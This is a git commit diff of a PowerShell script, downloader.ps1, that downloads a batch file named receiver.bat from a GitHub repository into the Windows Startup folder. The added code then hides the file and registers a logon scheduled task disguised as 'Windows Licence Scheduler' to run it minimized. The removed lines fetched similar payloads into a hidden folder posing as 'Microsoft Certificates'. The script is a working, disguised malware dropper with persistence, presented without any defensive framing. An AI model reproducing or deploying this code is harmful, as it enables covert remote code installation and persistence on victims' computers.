9f6931f672bfd10aa17b8f9ce9868482b870afd2
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-08-24 16:40:55 +0200

    Add files via upload

--- downloader.ps1
+++ downloader.ps1
@@ -1,14 +1,20 @@
-Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/starter.bat' -OutFile ([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\starter.bat'))
+# Download the batch file
+Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile ([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\receiver.bat'))
 
-$folderPath = "C:\ProgramData\Microsoft Certificates"
+# Hide the batch file
+Set-ItemProperty -Path ([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\receiver.bat')) -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
-if (-not (Test-Path -Path $folderPath)) {
-    New-Item -Path $folderPath -ItemType Directory
-    Write-Host "Folder 'Microsoft Certificates' created at $folderPath"
-} else {
-    Write-Host "Folder 'Microsoft Certificates' already exists at $folderPath"
-}
+# Create the scheduled task action
+$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min """" ""C:\Users\vikto\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\receiver.bat"""
 
-Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.ps1' -OutFile ([System.IO.Path]::Combine($env:APPDATA, 'C:\ProgramData\Microsoft Certificates\receiver.ps1'))
+# Create the scheduled task trigger
+$trigger = New-ScheduledTaskTrigger -AtLogon
 
-Set-ItemProperty -Path "C:\ProgramData\Microsoft Certificates\receiver.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+# Create the scheduled task principal
+$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
+
+# Create the scheduled task settings
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
+# Register the scheduled task with the name "Windows Licence Scheduler"
+Register-ScheduledTask -TaskName "Windows Licence Scheduler" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
